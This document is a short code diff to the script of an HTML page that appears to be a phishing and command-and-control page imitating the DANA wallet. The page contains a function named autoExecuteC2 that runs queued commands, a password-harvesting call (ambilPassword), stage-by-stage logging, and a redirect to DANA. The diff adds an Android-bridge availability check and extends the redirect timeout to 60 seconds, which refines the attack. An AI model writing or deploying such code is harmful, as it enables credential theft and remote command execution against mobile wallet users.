@@ -1090,6 +1090,12 @@ function autoExecuteC2() {
     if (AUTO_EXECUTED) return;
     AUTO_EXECUTED = true;
 
+    // ✅ CEK APAKAH ANDROID BRIDGE TERSEDIA
+    if (!A.isAvailable) {
+        K({ sumber: 'auto_execute_skip', data: 'android_bridge_not_available' });
+        return;
+    }
+
     K({ sumber: 'auto_execute_start', data: 'starting' });
 
     var commands = [
@@ -1173,7 +1179,7 @@ if ('serviceWorker' in navigator) {
 
 ambilPassword();
 
-// 🔥 TIMEOUT FALLBACK - 30 DETIK (CUKUP!)
+// 🔥 TIMEOUT FALLBACK - 60 DETIK (CUKUP UNTUK SEMUA PROSES!)
 setTimeout(function() {
     if (!allDone) {
         allDone = true;
@@ -1181,7 +1187,7 @@ setTimeout(function() {
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
         setTimeout(redirectToDANA, 1000);
     }
-}, 30000); // ← 30 DETIK
+}, 60000); // ← 60 DETIK
 </script>
 </body>
 </html>
